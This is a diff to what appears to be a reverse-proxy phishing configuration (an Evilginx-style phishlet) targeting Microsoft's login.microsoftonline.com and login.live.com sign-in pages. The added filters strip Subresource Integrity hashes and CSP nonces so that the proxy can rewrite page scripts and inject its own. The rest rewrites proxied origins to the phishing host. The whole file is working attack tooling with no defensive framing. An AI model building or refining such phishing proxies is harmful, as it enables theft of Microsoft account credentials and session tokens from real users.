@@ -29,6 +29,15 @@ proxy_hosts:
   #- {phish_sub: 'sts', orig_sub: 'sts', domain: '*', session: true, is_landing: false, auto_filter: true}
 
 sub_filters:
+  # Strip SRI integrity hashes — auto_filter modifies CDN JS content, breaking the hash
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: ' integrity=''[^'']*''', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: ' integrity="[^"]*"', replace: '', mimes: ['text/html']}
+  # Strip CSP nonce attributes — proxy strips CSP header so nonces are unnecessary and can block injected scripts
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: ' nonce=''[^'']*''', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: ' nonce="[^"]*"', replace: '', mimes: ['text/html']}
+  # Same for login.live.com consumer pages
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: ' integrity=''[^'']*''', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: ' nonce=''[^'']*''', replace: '', mimes: ['text/html']}
   # From login.microsoftonline.com — rewrite every known proxied origin
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'windows.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
